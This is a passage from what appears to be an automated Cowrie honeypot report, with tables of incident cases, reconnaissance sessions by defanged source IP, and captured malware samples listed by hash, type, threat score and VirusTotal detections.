| IR-f364043b446f | HIGH | `72.17.34[.]38` | 2026-10-16 07:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3c50deafcbb3 | HIGH | `120.48.175[.]69` | 2026-10-16 07:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-75a20859640d | HIGH | `120.48.175[.]69` | 2026-10-16 07:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d267d9c729a9 | HIGH | `163.7.11[.]126` | 2026-10-16 07:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-761247d60d6e | HIGH | `163.7.11[.]126` | 2026-10-16 07:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1f5cc3c5c5a7 | HIGH | `2.57.122[.]168` | 2026-10-16 08:01 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-c9c4cd035b21 | HIGH | `34.123.134[.]194` | 2026-10-16 08:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-786713376cc3 | HIGH | `34.123.134[.]194` | 2026-10-16 08:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-821e5ee63408 | HIGH | `176.53.159[.]196` | 2026-10-16 08:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c943324f4caf | HIGH | `113.171.81[.]144` | 2026-10-16 08:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6006e81ef013 | HIGH | `113.171.81[.]144` | 2026-10-16 08:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1a0347ecdd42 | HIGH | `164.30.17[.]82` | 2026-10-16 08:28 | Y | 1 | 0 | `T1078 · T1592` |
| IR-900abc416691 | HIGH | `103.248.120[.]6` | 2026-10-16 08:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-03e1a29078c1 | HIGH | `103.248.120[.]6` | 2026-10-16 08:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e505814600fc | HIGH | `85.198.54[.]207` | 2026-10-16 08:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-de7d51ce5c45 | HIGH | `130.12.180[.]51` | 2026-10-16 08:55 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-5766edd1e3e6 | HIGH | `109.160.32[.]41` | 2026-10-16 09:57 | Y | 1 | 0 | `T1078 · T1592` |
| IR-838b0199b6f8 | HIGH | `109.160.32[.]41` | 2026-10-16 10:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-2c08cb8c48e5 | HIGH | `176.53.159[.]196` | 2026-10-16 10:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d063bc9ed795 | HIGH | `118.145.107[.]219` | 2026-10-16 10:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ef2913498da5 | HIGH | `118.145.107[.]219` | 2026-10-16 10:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e082510d3127 | HIGH | `129.121.111[.]123` | 2026-10-16 10:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8af091d03384 | HIGH | `129.121.111[.]123` | 2026-10-16 10:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-72a9ffd080d7 | HIGH | `216.36.118[.]221` | 2026-10-16 10:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e02c38a26bba | HIGH | `130.12.180[.]51` | 2026-10-16 10:46 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-de0cb7e3d822 | HIGH | `40.83.182[.]122` | 2026-10-16 10:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
_… 34 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **2** | 2026-10-16 01:00 | 2026-10-16 02:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-16 08:17 | 2026-10-16 10:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-16 12:33 | 2026-10-16 14:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | **2** | 2026-10-16 13:14 | 2026-10-16 14:22 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]168` | **2** | 2026-10-16 07:30 | 2026-10-16 08:15 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `71.6.146[.]186` | **2** | 2026-10-16 13:31 | 2026-10-16 14:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]55` | **2** | 2026-10-16 03:56 | 2026-10-16 04:16 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.59[.]9` | 1 | 2026-10-16 01:21 | 2026-10-16 01:21 | 10s | 0 | `T1592` | 🟢 LOW |
| `104.28.192[.]82` | 1 | 2026-10-16 11:51 | 2026-10-16 11:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.28.224[.]82` | 1 | 2026-10-16 11:51 | 2026-10-16 11:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.13.46[.]38` | 1 | 2026-10-16 04:03 | 2026-10-16 04:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]31` | 1 | 2026-10-16 01:29 | 2026-10-16 01:29 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]41` | 1 | 2026-10-16 09:56 | 2026-10-16 09:57 | 8s | 0 | `T1592` | 🟢 LOW |
| `116.55.245[.]26` | 1 | 2026-10-16 13:37 | 2026-10-16 13:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.114[.]236` | 1 | 2026-10-16 07:14 | 2026-10-16 07:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.148[.]35` | 1 | 2026-10-16 08:21 | 2026-10-16 08:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.166.252[.]192` | 1 | 2026-10-16 11:30 | 2026-10-16 11:30 | 14s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-16 03:44 | 2026-10-16 03:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-16 06:42 | 2026-10-16 06:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-16 13:00 | 2026-10-16 13:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]32` | 1 | 2026-10-16 04:49 | 2026-10-16 04:49 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-16 09:13 | 2026-10-16 09:13 | 51s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-16 11:59 | 2026-10-16 11:59 | 18s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-16 14:28 | 2026-10-16 14:29 | 44s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-16 04:10 | 2026-10-16 04:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-16 06:13 | 2026-10-16 06:13 | 1s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]182` | 1 | 2026-10-16 07:01 | 2026-10-16 07:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]186` | 1 | 2026-10-16 06:13 | 2026-10-16 06:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.120[.]124` | 1 | 2026-10-16 10:29 | 2026-10-16 10:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.198[.]130` | 1 | 2026-10-16 05:33 | 2026-10-16 05:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.201[.]186` | 1 | 2026-10-16 07:21 | 2026-10-16 07:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-16 07:43 | 2026-10-16 07:44 | 73s | 0 | `T1592` | 🟢 LOW |
| `146.148.23[.]152` | 1 | 2026-10-16 04:58 | 2026-10-16 04:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `152.32.208[.]116` | 1 | 2026-10-16 03:38 | 2026-10-16 03:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `159.223.98[.]198` | 1 | 2026-10-16 13:25 | 2026-10-16 13:25 | 9s | 0 | `T1592` | 🟢 LOW |
| `165.154.164[.]112` | 1 | 2026-10-16 01:35 | 2026-10-16 01:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `168.205.176[.]199` | 1 | 2026-10-16 02:56 | 2026-10-16 02:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.11[.]4` | 1 | 2026-10-16 07:08 | 2026-10-16 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-16 13:18 | 2026-10-16 13:19 | 15s | 0 | `T1592` | 🟢 LOW |
| `178.16.55[.]133` | 1 | 2026-10-16 13:33 | 2026-10-16 13:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-10-16 04:24 | 2026-10-16 04:25 | 9s | 0 | `T1592` | 🟢 LOW |
| `180.167.207[.]234` | 1 | 2026-10-16 06:47 | 2026-10-16 06:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.118.64[.]225` | 1 | 2026-10-16 04:01 | 2026-10-16 04:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.61.20[.]116` | 1 | 2026-10-16 03:57 | 2026-10-16 03:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.251.230[.]98` | 1 | 2026-10-16 03:59 | 2026-10-16 04:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.232.15[.]53` | 1 | 2026-10-16 14:07 | 2026-10-16 14:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.99.7[.]32` | 1 | 2026-10-16 08:01 | 2026-10-16 08:01 | 12s | 0 | `T1592` | 🟢 LOW |
| `190.14.232[.]100` | 1 | 2026-10-16 09:02 | 2026-10-16 09:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.54.165[.]211` | 1 | 2026-10-16 02:14 | 2026-10-16 02:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.92.102[.]173` | 1 | 2026-10-16 07:07 | 2026-10-16 07:08 | 14s | 0 | `T1592` | 🟢 LOW |
| `190.99.77[.]132` | 1 | 2026-10-16 11:27 | 2026-10-16 11:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | 1 | 2026-10-16 01:32 | 2026-10-16 01:32 | 9s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.32.162[.]84` | 1 | 2026-10-16 14:43 | 2026-10-16 14:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-10-16 07:05 | 2026-10-16 07:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.164.107[.]5` | 1 | 2026-10-16 06:24 | 2026-10-16 06:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.50.235[.]156` | 1 | 2026-10-16 09:04 | 2026-10-16 09:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.123.210[.]209` | 1 | 2026-10-16 12:42 | 2026-10-16 12:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.123.219[.]34` | 1 | 2026-10-16 10:22 | 2026-10-16 10:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.182.22[.]227` | 1 | 2026-10-16 02:29 | 2026-10-16 02:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | 1 | 2026-10-16 03:09 | 2026-10-16 03:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.65.145[.]206` | 1 | 2026-10-16 10:42 | 2026-10-16 10:42 | 10s | 0 | `T1592` | 🟢 LOW |
| `20.84.92[.]124` | 1 | 2026-10-16 07:31 | 2026-10-16 07:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `201.219.164[.]66` | 1 | 2026-10-16 10:16 | 2026-10-16 10:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.194.41[.]69` | 1 | 2026-10-16 10:30 | 2026-10-16 10:30 | 29s | 0 | `T1592` | 🟢 LOW |
| `217.146.80[.]113` | 1 | 2026-10-16 01:41 | 2026-10-16 01:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.90.138[.]78` | 1 | 2026-10-16 07:33 | 2026-10-16 07:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.220.102[.]32` | 1 | 2026-10-16 06:31 | 2026-10-16 06:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `31.184.195[.]246` | 1 | 2026-10-16 01:24 | 2026-10-16 01:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.34.164[.]105` | 1 | 2026-10-16 14:19 | 2026-10-16 14:19 | 13s | 0 | `T1592` | 🟢 LOW |
| `35.187.11[.]54` | 1 | 2026-10-16 03:27 | 2026-10-16 03:27 | 4s | 0 | `T1592` | 🟢 LOW |
| `35.205.227[.]161` | 1 | 2026-10-16 02:51 | 2026-10-16 02:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.233.54[.]251` | 1 | 2026-10-16 04:58 | 2026-10-16 04:58 | 8s | 0 | `T1592` | 🟢 LOW |
| `35.241.214[.]195` | 1 | 2026-10-16 02:39 | 2026-10-16 02:39 | 15s | 0 | `T1592` | 🟢 LOW |
| `40.119.46[.]91` | 1 | 2026-10-16 01:55 | 2026-10-16 01:55 | 9s | 0 | `T1592` | 🟢 LOW |
| `40.124.186[.]191` | 1 | 2026-10-16 09:29 | 2026-10-16 09:29 | 10s | 0 | `T1592` | 🟢 LOW |
| `44.201.163[.]116` | 1 | 2026-10-16 01:28 | 2026-10-16 01:28 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.14.225[.]216` | 1 | 2026-10-16 07:47 | 2026-10-16 07:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-10-16 01:03 | 2026-10-16 01:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-10-16 10:02 | 2026-10-16 10:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.249.247[.]109` | 1 | 2026-10-16 03:22 | 2026-10-16 03:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.63.4[.]69` | 1 | 2026-10-16 07:32 | 2026-10-16 07:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.226.140[.]112` | 1 | 2026-10-16 09:56 | 2026-10-16 09:56 | 9s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-16 13:00 | 2026-10-16 13:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.209.234[.]84` | 1 | 2026-10-16 05:27 | 2026-10-16 05:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.210.182[.]18` | 1 | 2026-10-16 01:37 | 2026-10-16 01:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.129.41[.]146` | 1 | 2026-10-16 01:02 | 2026-10-16 01:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.205.72[.]208` | 1 | 2026-10-16 09:04 | 2026-10-16 09:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.34.94[.]207` | 1 | 2026-10-16 14:37 | 2026-10-16 14:37 | 7s | 1 | `T1110.001` | 🟢 LOW |
| `64.62.156[.]122` | 1 | 2026-10-16 10:30 | 2026-10-16 10:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]137` | 1 | 2026-10-16 03:09 | 2026-10-16 03:09 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]219` | 1 | 2026-10-16 03:09 | 2026-10-16 03:09 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]92` | 1 | 2026-10-16 02:22 | 2026-10-16 02:23 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]182` | 1 | 2026-10-16 01:40 | 2026-10-16 01:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]136` | 1 | 2026-10-16 08:30 | 2026-10-16 08:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]176` | 1 | 2026-10-16 08:57 | 2026-10-16 08:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]180` | 1 | 2026-10-16 09:55 | 2026-10-16 09:56 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]189` | 1 | 2026-10-16 02:53 | 2026-10-16 02:54 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]96` | 1 | 2026-10-16 14:38 | 2026-10-16 14:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]175` | 1 | 2026-10-16 02:53 | 2026-10-16 02:53 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]206` | 1 | 2026-10-16 04:10 | 2026-10-16 04:10 | 3s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]104` | 1 | 2026-10-16 02:54 | 2026-10-16 02:54 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]126` | 1 | 2026-10-16 09:55 | 2026-10-16 09:55 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]38` | 1 | 2026-10-16 08:57 | 2026-10-16 08:57 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]52` | 1 | 2026-10-16 09:56 | 2026-10-16 09:56 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-10-16 08:36 | 2026-10-16 08:37 | 5s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]137` | 1 | 2026-10-16 01:40 | 2026-10-16 01:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-16 02:14 | 2026-10-16 02:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-16 06:18 | 2026-10-16 06:18 | 1s | 0 | `T1592` | 🟢 LOW |
| `78.128.114[.]118` | 1 | 2026-10-16 08:26 | 2026-10-16 08:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.95[.]83` | 1 | 2026-10-16 05:24 | 2026-10-16 05:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.172.77[.]43` | 1 | 2026-10-16 04:53 | 2026-10-16 04:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]29` | 1 | 2026-10-16 12:02 | 2026-10-16 12:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]30` | 1 | 2026-10-16 12:04 | 2026-10-16 12:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.253.107[.]184` | 1 | 2026-10-16 14:02 | 2026-10-16 14:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.38.187[.]169` | 1 | 2026-10-16 09:55 | 2026-10-16 09:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.248.171[.]24` | 1 | 2026-10-16 11:54 | 2026-10-16 11:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-10-16 10:54 | 2026-10-16 10:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.43[.]221` | 1 | 2026-10-16 14:39 | 2026-10-16 14:39 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
